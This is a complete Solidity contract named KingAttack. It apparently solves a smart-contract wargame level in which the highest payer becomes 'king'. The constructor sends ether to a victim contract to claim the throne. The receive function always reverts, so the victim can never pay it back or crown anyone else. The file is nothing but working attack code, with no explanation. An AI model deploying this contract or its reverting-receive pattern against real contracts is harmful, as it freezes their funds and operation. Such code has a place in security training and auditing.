// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {

    constructor(address victim) public payable {
         (bool success, ) = victim.call{value: msg.value}("");
         require(success, "Call failed");
    }

    receive() external payable {
        revert('You cannot claim my throne!');
    }

}